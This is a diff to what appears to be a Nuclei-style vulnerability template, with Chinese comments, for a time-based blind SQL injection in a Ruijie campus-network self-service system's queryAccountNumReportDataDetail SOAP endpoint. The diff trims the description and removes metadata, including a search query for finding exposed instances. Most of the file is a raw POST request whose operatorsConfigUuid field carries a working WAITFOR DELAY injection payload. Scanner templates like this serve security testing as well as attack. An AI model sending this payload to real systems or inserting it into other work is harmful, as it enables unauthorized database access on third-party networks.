@@ -3,14 +3,8 @@ info:
   name: 锐捷网络股份有限公司校园网自助服务系统queryAccountNumReportDataDetail存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/8c53ddac71c574d2325d2bbee248b1b6
-
-    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 8c53ddac71c574d2325d2bbee248b1b6
-    fofa: + hunter`app="校园网自助服务系统"`
 http:
 - raw:
   - "POST /selfservice/service/operatorReportorRoamService HTTP/1.1\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\nCookie: JSESSIONID=42E7A33A54CABB1580E34F01B3D63480; JSESSIONID=0616C2E6B689FD5702EE3E2203D660FB\nConnection: close\nSOAPAction:\nContent-Type: text/xml;charset=UTF-8\nHost: {{Hostname}}\nContent-Length: 873\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ser=\"http://service.webservice.common.spl.ruijie.com\" xmlns:dom=\"http://domain.service.webservice.common.spl.ruijie.com\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <ser:queryAccountNumReportDataDetail>\n         <ser:in0>\n            <!--type: dateTime-->\n            <dom:endTime>2008-09-29T09:49:45</dom:endTime>\n\n            <!--type: int-->\n            <dom:limit>3</dom:limit>\n\n            <!--type: int-->\n            <dom:offSet>3</dom:offSet>\n\n            <!--type: string-->\n            <dom:operatorsConfigUuid>aeoliam venit';WAITFOR DELAY '0:0:5'--</dom:operatorsConfigUuid>\n\n            <!--type: dateTime-->\n            <dom:startTime>2014-06-09T23:15:04+08:00</dom:startTime>\n\n         </ser:in0>\n\n      </ser:queryAccountNumReportDataDetail>\n\n   </soapenv:Body>\n\n</soapenv:Envelope>"
